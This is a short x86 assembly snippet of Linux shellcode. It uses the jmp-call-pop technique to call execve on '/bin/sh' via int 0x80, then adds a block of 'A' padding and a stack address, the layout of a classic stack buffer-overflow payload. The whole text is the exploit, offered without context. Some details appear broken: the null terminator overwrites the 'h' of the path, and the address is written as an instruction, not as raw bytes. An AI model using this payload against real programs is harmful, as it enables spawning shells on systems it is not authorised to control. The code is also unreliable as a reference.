jmp _want_bin_bash
_got_bin_bash:
    # make a call to syscall of 'execve'
    nop
    nop
    nop
    xor ecx, ecx # argv
    xor edx, edx # envp
    mov eax, ecx
    add al, 0x0B # 11 -call for syscall execve
    pop ebx # path
    mov byte [ebx +  0x6], cl
    int 0x80
_want_bin_bash:
    call _got_bin_bash
    .ASCII "/bin/sh$"
    .ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    mov eax, 0xbfffdf99
